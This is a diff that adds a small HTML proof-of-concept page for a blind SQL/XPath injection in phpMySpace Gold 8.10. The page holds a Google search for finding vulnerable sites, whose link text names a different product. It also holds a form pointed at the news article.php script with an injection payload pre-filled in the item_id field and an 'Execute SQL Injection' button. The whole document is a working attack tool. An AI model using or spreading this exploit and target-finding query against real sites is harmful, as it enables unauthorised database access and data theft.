@@ -1,0 +1,18 @@
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;phpMySpace Gold (v8.10) - Blind SQL/XPath Injection Exploit&lt;/title&gt;&lt;body&gt;
+
+&lt;center&gt;&lt;br&gt;&lt;br&gt;&lt;font size=4&gt;phpMySpace Gold (v8.10) - Blind SQL/XPath Injection Exploit&lt;/font&gt;&lt;br&gt;&lt;font
+size=3&gt;discovered by &lt;a href=&quot;http://john-martinelli.com&quot;&gt;John Martinelli&lt;/a&gt;&lt;br&gt;&lt;br&gt;Google d0rk: &lt;a
+href=&quot;http://www.google.com/search?q=+%22Powered+by+phpMySpace+Gold+8.10%22&quot;&gt;&amp;quot;Powered by Ripe Website
+Manager&amp;quot;&lt;/a&gt;&lt;/font&gt;&lt;br&gt;
+
+&lt;br&gt;&lt;br&gt;
+&lt;form action=&quot;http://www.example.com/path/modules/news/article.php&quot; method=&quot;get&quot;&gt;
+&lt;input name=&quot;mode&quot; type=&quot;hidden&quot; value=&quot;0&quot;&gt;
+&lt;input name=&quot;order&quot; type=&quot;hidden&quot; value=&quot;0&quot;&gt;
+&lt;input name=&quot;item_id&quot; size=75 value=&quot;1&amp;quot; AND &amp;quot;1&amp;quot;=&amp;quot;0&quot;&gt;
+&lt;input type=submit value=&quot;Execute SQL Injection&quot; class=&quot;button&quot;&gt;
+&lt;/form&gt;
+
+&lt;/body&gt;&lt;/html&gt;
+
